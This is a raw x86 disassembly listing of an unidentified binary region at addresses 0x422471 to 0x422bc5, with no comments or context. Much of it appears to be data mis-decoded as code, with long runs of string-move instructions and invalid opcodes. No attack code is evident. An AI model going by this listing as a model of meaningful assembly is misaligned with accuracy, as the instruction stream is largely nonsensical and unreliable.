  422471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422472:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	fwait
  42247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  422484:	test   DWORD PTR [esi+0x16],0x91a814ae
  42248b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248c:	aaa    
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	fwait
  42248f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422490:	jae    0x422436
  422492:	popf   
  422493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422494:	pop    ss
  422495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422496:	xchg   ebp,eax
  422497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422498:	push   ecx
  422499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249a:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  4224a1:	inc    edx
  4224a2:	ror    DWORD PTR [eax+esi*8-0x54],1
  4224a6:	imul   BYTE PTR [esi-0x77eb71ea]
  4224ac:	xchg   ecx,eax
  4224ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ae:	aaa    
  4224af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b0:	fwait
  4224b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b2:	jae    0x422458
  4224b4:	popf   
  4224b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b6:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  4224bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224be:	fwait
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224c7:	mov    esi,?
  4224c9:	mov    ss,WORD PTR [esi]
  4224cb:	out    dx,al
  4224cc:	adc    al,0xe8
  4224ce:	xchg   ecx,eax
  4224cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d0:	aaa    
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	fwait
  4224d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d4:	jae    0x42247a
  4224d6:	popf   
  4224d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	fwait
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  4224ea:	imul   dh
  4224ec:	push   ss
  4224ed:	into   
  4224ee:	adc    al,0xc8
  4224f0:	xchg   ecx,eax
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	cmp    eax,0x51a49ba4
  4224f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f8:	popf   
  4224f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fa:	jnp    0x4224a0
  4224fc:	xchg   ebx,eax
  4224fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fe:	fwait
  4224ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422500:	xchg   ecx,eax
  422501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422502:	shl    dl,cl
  422504:	shr    ah,1
  422506:	lock int3 
  422508:	test   dh,0x16
  42250b:	cs adc al,0x28
  42250e:	push   ss
  42250f:	push   cs
  422510:	adc    al,0x8
  422512:	xchg   ebx,eax
  422513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422514:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42251b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422524:	fwait
  422525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422526:	lea    esp,[edx+edx*8-0xfd32fde]
  42252d:	or     al,0xf6
  42252f:	push   cs
  422530:	push   ss
  422531:	outs   dx,BYTE PTR ds:[esi]
  422532:	adc    al,0x68
  422534:	xchg   ecx,eax
  422535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422536:	add    BYTE PTR [eax],al
  422538:	shl    BYTE PTR [ebx],0x42
  42253b:	add    ah,cl
  42253d:	and    eax,0x25d40042
  422542:	inc    edx
  422543:	add    BYTE PTR [edi+eiz*1+0x42],bl
  422547:	add    BYTE PTR [eax-0x27ffbddd],bh
  42254d:	and    eax,0x7c3a0042
  422552:	inc    edx
  422553:	add    BYTE PTR [edx-0x37ffbd82],dh
  422559:	es inc edx
  42255b:	add    BYTE PTR [edi+eiz*1+0x42],cl
  42255f:	add    BYTE PTR [ebp+eiz*1+0x25b80042],dh
  422566:	inc    edx
  422567:	add    BYTE PTR [eax+0x27],cl
  42256a:	inc    edx
  42256b:	add    BYTE PTR [esi+eiz*1],bl
  42256e:	inc    edx
  42256f:	add    BYTE PTR [edx-0x35],cl
  422572:	push   es
  422573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422574:	scas   al,BYTE PTR es:[edi]
  422575:	or     al,0x6
  422577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422578:	shl    BYTE PTR ds:0x26800042,1
  42257e:	inc    edx
  42257f:	add    BYTE PTR [esi+eiz*1+0x26a00042],dl
  422586:	inc    edx
  422587:	add    BYTE PTR [eax+0x8004226],dh
  42258d:	es inc edx
  42258f:	add    BYTE PTR [ebx+eiz*1+0x26280042],bh
  422596:	inc    edx
  422597:	add    BYTE PTR [eax],bl
  422599:	es inc edx
  42259b:	add    BYTE PTR [eax+0x27],ah
  42259e:	inc    edx
  42259f:	add    BYTE PTR [esi+0x38a4069a],ch
  4225a5:	inc    ebx
  4225a6:	out    0xbd,eax
  4225a8:	cmp    BYTE PTR [esi],ah
  4225aa:	inc    edx
  4225ab:	add    BYTE PTR [eax+0x26],al
  4225ae:	inc    edx
  4225af:	add    ah,bl
  4225b1:	and    eax,0x87240042
  4225b6:	loopne 0x422575
  4225b8:	jbe    0x422635
  4225ba:	pop    ds
  4225bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225bc:	add    BYTE PTR [eax],al
  4225be:	inc    eax
  4225bf:	add    dl,ch
  4225c1:	rcl    dl,cl
  4225c3:	pop    ecx
  4225c4:	scas   eax,DWORD PTR es:[edi]
  4225c5:	jle    0x422609
  4225c7:	add    bl,bl
  4225c9:	outs   dx,DWORD PTR fs:[esi]
  4225cb:	arpl   WORD PTR [edi+0xf],si
  4225ce:	pop    ebx
  4225cf:	xor    DWORD PTR [esi-0x5],esi
  4225d2:	(bad)  
  4225d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225d4:	mov    dl,0xc
  4225d6:	xchg   ebx,eax
  4225d7:	test   al,0xc4
  4225d9:	and    eax,0xdaaa0042
  4225de:	push   es
  4225df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e0:	stos   BYTE PTR es:[edi],al
  4225e1:	fiadd  WORD PTR [esi]
  4225e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225e5:	fiadd  DWORD PTR [esi]
  4225e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e8:	mov    ds:0xbea406da,al
  4225ed:	fiadd  DWORD PTR [esi]
  4225ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f0:	mov    edx,0xb6a406da
  4225f5:	fiadd  DWORD PTR [esi]
  4225f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f8:	mov    dl,0xda
  4225fa:	push   es
  4225fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225fc:	mov    ds,edx
  4225fe:	push   es
  4225ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422600:	mov    bl,dl
  422602:	push   es
  422603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422604:	out    dx,al
  422605:	fiadd  DWORD PTR [esi]
  422607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422608:	dec    DWORD PTR [ebx]
  42260a:	adc    edi,DWORD PTR [edx]
  42260c:	mov    ah,0x23
  42260e:	inc    edx
  42260f:	add    BYTE PTR [ebp+0x17004228],ah
  422615:	loop   0x4225a0
  422617:	js     0x4225c7
  422619:	call   0xa4d7:0xcb3aa406
  422620:	and    al,0x75
  422622:	add    BYTE PTR [eax],al
  422624:	mov    al,0x23
  422626:	inc    edx
  422627:	add    BYTE PTR [edx],ah
  422629:	inc    ebx
  42262a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422638:	hlt    
  422639:	clc    
  42263a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422640:	sub    eax,DWORD PTR [edi+0x1f]
  422643:	jle    0x422645
	...
  422669:	add    BYTE PTR [eax],al
  42266b:	add    BYTE PTR [edx],bh
  42266d:	jl     0x4226b1
	...
  42267b:	add    cl,bh
  42267d:	jmp    0xa48f26c3
  422682:	push   ecx
  422683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422684:	jg     0x42262a
  422686:	inc    edi
  422687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422688:	push   ecx
  422689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268a:	inc    ebx
  42268b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268c:	std    
  42268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268e:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  422695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422696:	push   ebx
  422697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422698:	dec    ecx
  422699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269a:	std    
  42269b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269c:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  4226a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a4:	push   ecx
  4226a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a6:	jg     0x42264c
  4226a8:	std    
  4226a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226aa:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  4226b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b2:	dec    ebx
  4226b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b4:	inc    ebx
  4226b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b6:	jne    0x42265c
  4226b8:	pop    ecx
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	jnp    0x422660
  4226bc:	dec    ecx
  4226bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226be:	fwait
  4226bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226c8:	xor    eax,eax
  4226ca:	xor    esp,DWORD PTR [eax]
  4226cc:	xor    eax,DWORD PTR [eax]
  4226ce:	xor    esp,DWORD PTR [eax+0x33]
  4226d1:	inc    eax
  4226d2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226d8:	xor    al,al
  4226da:	xor    ah,BYTE PTR [eax]
  4226dc:	xor    al,BYTE PTR [eax]
  4226de:	xor    ah,BYTE PTR [eax+0x32]
  4226e1:	inc    eax
  4226e2:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  4226e8:	xor    ecx,esp
  4226ea:	xor    ecx,esi
  4226ec:	xor    ecx,eax
  4226ee:	xor    ecx,edx
  4226f0:	xor    edx,esp
  4226f2:	xor    edx,esi
  4226f4:	xor    edx,eax
  4226f6:	xor    edx,edx
  4226f8:	xor    ebx,esp
  4226fa:	xor    ebx,esi
  4226fc:	xor    ebx,eax
  4226fe:	xor    ebx,edx
  422700:	xor    eax,esi
  422702:	push   ebx
  422703:	shl    BYTE PTR [ebx-0x40],0x93
  422707:	rcl    DWORD PTR [esi-0x56],0x15
  42270b:	into   
  42270c:	xchg   ebp,eax
  42270d:	dec    ecx
  42270e:	xor    ecx,esp
  422710:	sbb    eax,0x50abaae2
  422715:	push   0x1e
  422717:	cs je  0x42272e
  42271a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422720:	imul   edi,edx,0xffffffd5
  422723:	leave  
  422724:	daa    
  422725:	dec    eax
  422726:	out    dx,eax
  422727:	pushf  
  422728:	mov    dh,0xdf
  42272a:	dec    esi
  42272b:	xchg   ebp,eax
  42272c:	lock xor DWORD PTR [esi-0x6c],ebp
  422730:	inc    ebp
  422731:	or     eax,0xc1470876
  422736:	js     0x4226f3
  422738:	popa   
  422739:	pop    ecx
  42273a:	jecxz  0x4227a7
  42273c:	mov    BYTE PTR [edx-0x56],0x5
  422740:	cs enter 0xaa46,0x44
  422745:	aas    
  422746:	inc    ebp
  422747:	leave  
  422748:	test   BYTE PTR [ebx+0x819a593],0xd8
  42274f:	jl     0x422799
  422751:	mov    es,WORD PTR [edx+0x0]
  422754:	jb     0x4227b0
  422756:	pop    ss
  422757:	sub    edi,DWORD PTR [ebp+eiz*1+0x26200042]
  42275e:	inc    edx
  42275f:	add    BYTE PTR [esi-0x5],dh
  422762:	fbld   TBYTE PTR [ebp+0x0]
	...
  422770:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422776:	popa   
  422777:	arpl   WORD PTR [edi+0x7a],bp
  42277a:	popa   
  42277b:	outs   dx,DWORD PTR ds:[si]
  42277d:	gs ins DWORD PTR es:[edi],dx
  42277f:	jae    0x4227c3
  422781:	outs   dx,DWORD PTR ds:[esi]
  422782:	ins    BYTE PTR es:[edi],dx
  422783:	gs mov cl,0x65
  422786:	in     eax,dx
  422787:	jg     0x4227c2
  422789:	ja     0x4227f4
  42278b:	jp     0x422780
  42278d:	inc    esp
  42278e:	push   0x1b
  422790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422791:	push   ecx
  422792:	dec    esp
  422793:	gs jb  0x42280f
  422796:	popa   
  422797:	push   ebx
  422798:	jne    0x42280b
  42279a:	jae    0x4227fd
  42279c:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  4227a3:	inc    esp
  4227a4:	(bad)  [edx+0x65]
  4227a7:	jae    0x4227ff
  4227a9:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  4227b0:	jb     0x422814
  4227b2:	gs je  0x422788
  4227b5:	lds    edx,FWORD PTR [eax-0x68]
  4227b8:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  4227bc:	fs jne 0x42282e
  4227bf:	push   eax
  4227c0:	gs fs jae 0x422831
  4227c4:	popa   
  4227c5:	ins    DWORD PTR es:[edi],dx
  4227c6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227d9:	add    BYTE PTR [eax],al
  4227db:	add    BYTE PTR [esp+ecx*4],ch
  4227de:	push   ss
  4227df:	mov    esi,0x6f4c8773
  4227e4:	jb     0x422854
  4227e6:	jno    0x422851
  4227e8:	or     al,0x36
  4227ea:	lods   al,BYTE PTR ds:[esi]
  4227eb:	repnz push edx
  4227ed:	je     0x42285e
  4227ef:	je     0x422835
  4227f1:	js     0x4227af
  4227f3:	cmc    
  4227f4:	outs   dx,DWORD PTR ds:[esi]
  4227f5:	ins    DWORD PTR es:[edi],dx
  4227f6:	popa   
  4227f7:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  4227fe:	popa   
  4227ff:	jb     0x422876
  422801:	push   0x68736f79
  422806:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42280d:	mov    ch,0xa5
  42280f:	jns    0x422884
  422811:	outs   dx,DWORD PTR ds:[esi]
  422812:	addr16 popa 
  422814:	add    BYTE PTR [bp+si],bh
  422817:	sub    bh,cl
  422819:	icebp  
  42281a:	gs ins BYTE PTR es:[edi],dx
  42281c:	jae    0x422866
  42281e:	popa   
  42281f:	je     0x422889
  422821:	ins    DWORD PTR es:[edi],dx
  422822:	add    BYTE PTR gs:[bx+si],al
  422826:	in     al,dx
  422827:	mov    ecx,0x414ad1d2
  42282c:	ins    DWORD PTR es:[edi],dx
  42282d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422834:	gs ins DWORD PTR es:[edi],dx
  422836:	add    BYTE PTR [eax],al
  422838:	jne    0x42284a
  42283a:	popa   
  42283b:	or     BYTE PTR [esi+0x73654dbb],al
  422841:	popa   
  422842:	push   0x78000061
  422847:	loope  0x42288b
  422849:	stos   BYTE PTR es:[edi],al
  42284a:	je     0x4228ad
  42284c:	push   edi
  42284d:	popa   
  42284e:	jb     0x4228bb
  422850:	jae    0x4228bd
  422852:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422859:	loope  0x422827
  42285b:	aad    0x6f
  42285d:	jb     0x4228cb
  42285f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422866:	je     0x42287b
  422868:	adc    al,BYTE PTR [ebp+0x77646172]
  42286e:	outs   dx,DWORD PTR ds:[esi]
  42286f:	gs ins DWORD PTR es:[edi],dx
  422871:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422878:	outs   dx,BYTE PTR ds:[esi]
  422879:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  422880:	ja     0x4228e6
  422882:	outs   dx,DWORD PTR ds:[esi]
  422883:	popa   
  422884:	outs   dx,BYTE PTR ds:[esi]
  422885:	gs jae 0x4228ea
  422888:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  42288f:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  422897:	inc    ebx
  422898:	jb     0x422853
  42289a:	sbb    al,0xd9
  42289c:	jo     0x422907
  42289e:	addr16 js 0x422916
  4228a1:	jo     0x422918
  4228a3:	fs add ch,cl
  4228a6:	xchg   esi,eax
  4228a7:	in     eax,dx
  4228a8:	jno    0x42291b
  4228aa:	iret   
  4228ab:	jbe    0x4228a6
  4228ad:	or     dh,BYTE PTR [esi-0x3]
  4228b0:	cwde   
  4228b1:	int    0xd6
  4228b3:	std    
  4228b4:	pop    ebp
  4228b5:	fsubr  DWORD PTR [edi]
  4228b7:	dec    edx
  4228b8:	xor    eax,0xd6cd860a
  4228bd:	stc    
  4228be:	inc    ebx
  4228bf:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228c5:	dec    edx
  4228c6:	sbb    BYTE PTR [ecx+0x52],bh
  4228c9:	mov    ch,al
  4228cb:	jns    0x42291f
  4228cd:	dec    edx
  4228ce:	sbb    BYTE PTR [ecx+0x6e],bh
  4228d1:	xchg   edx,eax
  4228d2:	cmp    eax,0xcd96c5cb
  4228d7:	in     eax,dx
  4228d8:	jno    0x42294b
  4228da:	iret   
  4228db:	jbe    0x4228d6
  4228dd:	or     dh,BYTE PTR [esi-0x3]
  4228e0:	int    0x96
  4228e2:	std    
  4228e3:	pop    ebp
  4228e4:	jns    0x422931
  4228e6:	pop    edx
  4228e7:	xor    eax,0x96cd920a
  4228ec:	stc    
  4228ed:	inc    ebx
  4228ee:	icebp  
  4228ef:	(bad)  
  4228f0:	das    
  4228f1:	int    0x76
  4228f3:	mov    BYTE PTR [ecx+0x6e],bh
  4228f6:	mov    DWORD PTR [edx-0x13749387],esi
  4228fc:	jns    0x42296c
  4228fe:	xchg   BYTE PTR [edi-0x3d789187],ah
  422904:	retf   
  422905:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42290c:	jno    0x4228dd
  42290e:	jbe    0x422909
  422910:	or     dh,BYTE PTR [esi-0x3]
  422913:	int    0x96
  422915:	std    
  422916:	pop    ebp
  422917:	fdiv   DWORD PTR [ebx-0x6df55465]
  42291d:	int    0x96
  42291f:	stc    
  422920:	inc    ebx
  422921:	icebp  
  422922:	(bad)  
  422923:	test   BYTE PTR [ecx+0x6e],bh
  422926:	mov    ebp,esp
  422928:	int    0x76
  42292a:	mov    BYTE PTR [ecx+0x6e],bh
  42292d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422934:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42293b:	jno    0x42290c
  42293d:	jbe    0x422938
  42293f:	or     dh,BYTE PTR [esi-0x3]
  422942:	cwde   
  422943:	int    0xd6
  422945:	std    
  422946:	pop    ebp
  422947:	ret    0x2be4
  42294a:	cmp    DWORD PTR [edx],ecx
  42294c:	xchg   ch,cl
  42294e:	(bad)  
  42294f:	stc    
  422950:	inc    ebx
  422951:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422957:	test   BYTE PTR [ebx-0x78913648],ch
  42295d:	ret    0x79ab
  422960:	xchg   edx,eax
  422961:	aad    0xcb
  422963:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422969:	iret   
  42296a:	jbe    0x422965
  42296c:	or     dh,BYTE PTR [esi-0x3]
  42296f:	int    0x96
  422971:	std    
  422972:	pop    ebp
  422973:	pop    ecx
  422974:	ins    BYTE PTR es:[edi],dx
  422975:	cmp    dh,BYTE PTR ds:0x96cd920a
  42297b:	stc    
  42297c:	inc    ebx
  42297d:	icebp  
  42297e:	(bad)  
  42297f:	push   ebx
  422980:	int    0x76
  422982:	mov    BYTE PTR [ecx+0x6e],bh
  422985:	mov    BYTE PTR [edi+0x47816c79],ah
  42298b:	jns    0x4229fb
  42298d:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  422993:	call   0xcded:0xcd965b98
  42299a:	jbe    0x4229d0
  42299c:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  4229a3:	sbb    al,0x81
  4229a5:	(bad)  
  4229a6:	and    al,0x98
  4229a8:	int    0xd6
  4229aa:	adc    al,0x47
  4229ac:	mov    ds:0xff8eca62,al
  4229b1:	add    al,0x7d
  4229b3:	add    ch,dl
  4229b5:	lods   eax,DWORD PTR ds:[esi]
  4229b6:	clc    
  4229b7:	icebp  
  4229b8:	jo     0x422984
  4229ba:	(bad)  
  4229bc:	jge    0x4229be
  4229be:	aad    0xad
  4229c0:	clc    
  4229c1:	icebp  
  4229c2:	jo     0x422956
  4229c4:	adc    ecx,ebp
  4229c6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229cd:	jo     0x422a3f
  4229cf:	jo     0x422a41
  4229d1:	jo     0x42296d
  4229d3:	xor    esi,edi
  4229d5:	cwde   
  4229d6:	add    al,0xc
  4229d8:	add    BYTE PTR [ebp-0x80],bl
  4229db:	xchg   DWORD PTR [eax-0x30522a80],eax
  4229e1:	or     DWORD PTR [eax-0x75],ebx
  4229e4:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  4229eb:	jecxz  0x4229d8
  4229ed:	hlt    
  4229ee:	scas   eax,DWORD PTR es:[edi]
  4229ef:	rol    BYTE PTR [ebp-0x6def4262],0x80
  4229f6:	sub    dl,0xfa
  4229f9:	iret   
  4229fa:	pop    eax
  4229fb:	iret   
  4229fc:	push   0xffffffcd
  4229fe:	out    0xfd,al
  422a00:	int    0x76
  422a02:	adc    DWORD PTR [ebx],esi
  422a04:	out    0x34,al
  422a06:	sub    ecx,ecx
  422a08:	or     dh,BYTE PTR [esi-0x43]
  422a0b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a11:	sub    BYTE PTR [edi],0x6
  422a14:	sub    DWORD PTR [eax-0x72357f80],eax
  422a1a:	cmc    
  422a1b:	sub    esp,esi
  422a1d:	in     eax,dx
  422a1e:	aad    0xe9
  422a20:	add    ebx,ebp
  422a22:	mov    bh,dh
  422a24:	fcmovnbe st,st(5)
  422a26:	out    dx,eax
  422a27:	pushf  
  422a28:	xchg   edi,edi
  422a2a:	test   al,0xcf
  422a2c:	fs adc ebx,0xffffffe9
  422a30:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a34:	iret   
  422a35:	int3   
  422a36:	call   0x80c278ff
  422a3b:	jno    0x4229d5
  422a3d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a47:	int    0xe6
  422a49:	std    
  422a4a:	xor    esp,esi
  422a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a4d:	das    
  422a4e:	pop    ecx
  422a4f:	push   0xffffffcd
  422a51:	(bad)  
  422a52:	or     eax,0xfcde9e3
  422a57:	sub    edi,eax
  422a59:	xchg   DWORD PTR [edi],ecx
  422a5b:	iret   
  422a5c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a62:	add    BYTE PTR [eax-0x102c8233],0x88
  422a69:	add    al,0xf2
  422a6b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a72:	adc    dh,0x4e
  422a75:	inc    ebx
  422a76:	jns    0x4229fa
  422a78:	fldlg2 
  422a7a:	es int 0xc6
  422a7d:	or     eax,0x809221bd
  422a82:	add    al,0x81
  422a85:	mov    al,ds:0xfb87d287
  422a8a:	add    al,0xbd
  422a8c:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422a93:	jns    0x422a62
  422a95:	ins    DWORD PTR es:[edi],dx
  422a96:	and    ch,0xa0
  422a99:	push   edx
  422a9a:	add    al,0x3
  422a9c:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422aa2:	push   edx
  422aa3:	add    al,0x3
  422aa5:	push   ebx
  422aa6:	mov    al,cl
  422aa8:	test   bh,bh
  422aaa:	retf   
  422aab:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422ab3:	(bad)  
  422ab4:	in     al,dx
  422ab5:	outs   dx,DWORD PTR ds:[esi]
  422ab6:	rcl    bl,1
  422ab8:	(bad)  
  422ab9:	jge    0x422a78
  422abb:	outs   dx,DWORD PTR ds:[esi]
  422abc:	xchg   edx,eax
  422abd:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422ac4:	sahf   
  422ac5:	mov    al,ds:0x3454009e
  422aca:	jno    0x422b2e
  422acc:	popa   
  422acd:	mov    ah,0x86
  422acf:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422ad6:	push   cs
  422ad7:	(bad)  
  422ad8:	jge    0x422a97
  422ada:	push   eax
  422adb:	xchg   edx,eax
  422adc:	add    BYTE PTR [eax+0x2d048d6],0xff
  422ae3:	jge    0x422aa2
  422ae5:	push   ss
  422ae6:	xchg   edx,eax
  422ae7:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422aee:	ror    BYTE PTR [ecx+0x53d09282],1
  422af4:	jo     0x422ac3
  422af6:	(bad)  
  422af7:	std    
  422af8:	xor    edx,esi
  422afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422afb:	inc    ebx
  422afc:	(bad)  
  422afd:	xor    al,0x2f
  422aff:	or     esp,ebx
  422b01:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b0b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b15:	int    0xd6
  422b17:	popf   
  422b18:	aam    0x23
  422b1a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b20:	or     ch,0xd6
  422b23:	xchg   ebp,eax
  422b24:	aam    0x89
  422b26:	int    0xd6
  422b28:	icebp  
  422b29:	int    0x8d
  422b2b:	xchg   ebp,eax
  422b2c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b32:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b38:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b3e:	pushf  
  422b3f:	stos   BYTE PTR es:[edi],al
  422b40:	sahf   
  422b41:	popa   
  422b42:	mov    esp,0xc180804a
  422b47:	mov    BYTE PTR [edi+0x649a62d9],al
  422b4d:	mov    ecx,edx
  422b4f:	rol    DWORD PTR [edx+0x70878492],cl
  422b55:	int    0xc6
  422b57:	or     eax,0x808169bd
  422b5c:	adc    dh,0x14
  422b5f:	int    0x76
  422b61:	mov    ebp,0xd30de6cd
  422b66:	lods   eax,DWORD PTR ds:[esi]
  422b67:	xchg   DWORD PTR [ebx],esi
  422b69:	retf   
  422b6a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b71:	in     al,dx
  422b72:	push   esi
  422b73:	int    0xc6
  422b75:	or     eax,0xbd92c704
  422b7a:	daa    
  422b7b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422b85:	or     eax,0xc087add3
  422b8a:	mov    BYTE PTR [esi-0x30577740],bl
  422b90:	gs jp  0x422b17
  422b93:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422b9d:	xchg   esi,esp
  422b9f:	or     eax,0x699e30c0
  422ba4:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422bab:	xor    ebp,DWORD PTR [ebp+0x6c]
  422bae:	int    0x10
  422bb0:	mov    ebp,0x808081bc
  422bb5:	int    0x7d
  422bb7:	xor    ecx,DWORD PTR [edi]
  422bb9:	xor    ah,0x81
  422bbc:	lea    esi,[ebp-0x7b8a19fc]
  422bc2:	das    
  422bc3:	add    al,0xd0
  422bc5:	add    BYTE PTR [eax+0x75760480],0x8b
